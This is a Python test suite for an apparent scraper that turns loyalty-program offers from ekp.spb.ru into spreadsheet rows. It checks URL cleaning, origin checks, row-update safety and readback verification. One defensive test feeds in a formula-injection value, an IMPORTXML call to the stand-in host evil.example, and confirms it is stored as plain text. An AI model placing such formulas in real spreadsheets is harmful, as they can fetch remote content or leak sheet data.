"""Synthetic fixtures: these tests do not establish live catalog coverage."""
import importlib.util
from pathlib import Path
import unittest

spec = importlib.util.spec_from_file_location('model', Path(__file__).parents[1] / 'model.py')
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)

class SafetyTests(unittest.TestCase):
    def test_card_url_preserves_region_but_removes_tracking(self):
        self.assertEqual(m.clean_url('https://ekp.spb.ru/capabilities/loyalty/tiles/1301?region=78&utm_source=x#top'), 'https://ekp.spb.ru/capabilities/loyalty/tiles/1301?region=78')
    def test_off_origin_and_catalog_are_not_offer_urls(self):
        cfg = {'host':'ekp.spb.ru','offer_pattern':r'/capabilities/loyalty/tiles/\d+/?'}
        self.assertFalse(m.is_offer('https://evil.example/capabilities/loyalty/tiles/123', cfg))
        self.assertFalse(m.is_offer('https://ekp.spb.ru/capabilities/loyalty/', cfg))
        self.assertFalse(m.is_offer('https://user:pw@ekp.spb.ru/capabilities/loyalty/tiles/1', cfg))
        self.assertTrue(m.is_offer('https://ekp.spb.ru/capabilities/loyalty/tiles/123?region=78', cfg))
    def test_blocked_page_is_not_a_benefit(self):
        self.assertIsNone(m.make_record('ekp', 'https://ekp.spb.ru/capabilities/loyalty/tiles/1', 'Access denied', '403 Forbidden Access denied', '2026-09-12T10:00:00+00:00'))
    def test_unknown_dates_are_not_invented(self):
        r = m.make_record('ekp', 'https://ekp.spb.ru/capabilities/loyalty/tiles/1', 'Test partner', 'Test partner\nУсловия предложения: скидка 10%. Предъявите карту участника перед оплатой.', '2026-09-12T10:00:00+00:00')
        self.assertIsNotNone(r)
        self.assertEqual(r['status'], 'needs_review')
        self.assertEqual(r['terms'], 'Test partner\nУсловия предложения: скидка 10%. Предъявите карту участника перед оплатой.')
    def test_no_silent_truncation_of_conditions(self):
        with self.assertRaises(ValueError):
            m.make_record('ekp', 'https://ekp.spb.ru/x', 'X', 'условия 10% ' * 6000, '2026-09-12T10:00:00+00:00')
    def test_literal_formula_text_is_not_executable(self):
        c = m.cell('=IMPORTXML("https://evil.example", "//x")')
        self.assertEqual(c, {'userEnteredValue': {'stringValue': '=IMPORTXML("https://evil.example", "//x")'}})
    def test_retry_is_idempotent(self):
        rows = [['id','value'], ['key1','old']]
        planned = m.plan_rows(rows, [['key1','new']], 2)
        self.assertEqual(planned, [(1, ['key1','new'])])
        self.assertEqual(m.plan_rows([rows[0], ['key1','new']], [['key1','new']], 2), [])
    def test_existing_manual_columns_are_preserved(self):
        result = m.plan_rows([['id','value'], ['key1','old','manual note']], [['key1','new']], 2)
        self.assertEqual(result, [(1,['key1','new'])])
    def test_missing_records_are_never_deleted(self):
        self.assertEqual(m.plan_rows([['id','value'], ['key1','old']], [], 2), [])
    def test_duplicates_fail_closed(self):
        with self.assertRaises(ValueError):
            m.plan_rows([['id','value'], ['x','a'], ['x','b']], [['x','c']], 2)
        with self.assertRaises(ValueError):
            m.plan_rows([['id','value']], [['x','a'], ['x','b']], 2)
    def test_new_rows_follow_existing_even_with_holes(self):
        self.assertEqual(m.plan_rows([['id','value'], [], ['x','old']], [['y','new']], 2), [(3,['y','new'])])
    def test_readback_mismatch_is_not_success(self):
        with self.assertRaises(ValueError):
            m.verify_rows([['id','value'], ['x','wrong']], [(1,['x','new'])], 2)
        m.verify_rows([['id','value'], ['x','new']], [(1,['x','new'])], 2)

if __name__ == '__main__': unittest.main()
